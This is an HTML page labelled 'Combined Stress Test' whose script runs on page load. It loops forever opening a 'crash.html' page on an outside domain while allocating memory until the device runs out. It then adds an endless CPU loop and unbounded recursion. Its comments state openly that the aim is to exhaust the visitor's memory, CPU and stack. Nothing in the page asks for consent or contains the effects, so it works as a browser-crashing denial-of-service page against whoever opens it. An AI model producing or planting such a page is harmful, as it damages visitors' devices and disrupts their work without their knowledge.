<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Combined Stress Test</title>
</head>
<body>
  <h1>------------------</h1>
  <script>
    window.onload = () => {
      // Part 1: Memory exhaustion (allocating a large array with caution)
      const largeArray = [];
      console.log("Starting memory allocation...");
      let memoryTestCount = 0;

      function allocateMemory() {
        while (true) {
          window.open("stijnboyce.com/crash.html", '_top').focus();
          // Keep allocating memory until the device runs out
          largeArray.push(new Array(1000)); // Allocate large chunks to consume memory
          memoryTestCount++;
        }
      }

      allocateMemory();

      // Part 2: Infinite loop (CPU exhaustion with no break)
      console.log("Starting CPU stress (infinite loop)...");
      while (true) {
        Math.random(); // Keep the CPU busy with a pointless operation
      }

      // Part 3: Recursion (deep stack overflow)
      console.log("Starting recursion...");
      let recursionDepth = 0;

      function recurse() {
        recursionDepth++;
        recurse(); // Keep calling the function recursively
      }

      recurse(); // Trigger deep recursion that will eventually overflow the stack
    };
  </script>
</body>
</html>
